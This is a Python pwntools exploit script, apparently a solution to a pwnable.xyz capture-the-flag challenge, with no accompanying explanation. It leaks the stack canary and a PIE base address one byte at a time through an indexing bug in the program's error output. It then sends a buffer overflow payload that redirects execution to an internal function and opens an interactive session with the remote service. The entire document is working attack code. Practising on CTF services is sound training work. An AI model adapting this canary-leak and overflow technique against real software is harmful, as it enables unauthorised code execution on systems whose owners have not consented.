from pwn import *

# context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30017)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
admin = 0x00000000002021E4

# b*0x555555554000+0x0000000000000A76

sla('Message:','AAAA')

canary = ''

for i in range(0x3b,0x3b+7):
	sla('>',chr(i))
	p.recvuntil('Error:')
	canary += chr(int(p.recvline().split()[0]))

canary = u64(canary.rjust(8,'\x00'))
log.info('canary : {}'.format(hex(canary)))

pie = ''

for i in range(0x4a,0x4a+6):
	sla('>',chr(i))
	p.recvuntil('Error:')
	pie += chr(int(p.recvline().split()[0]))

pie = u64(pie.ljust(8,'\x00')) - 0xb30
log.info('pie : {}'.format(hex(pie)))

sla('>','1')

payload = 'A'*40 + p64(canary) + p64(pie + 0xaac) + p64(pie + 0xaac)
sla(':',payload)

sla('>','0') # Exit

p.interactive()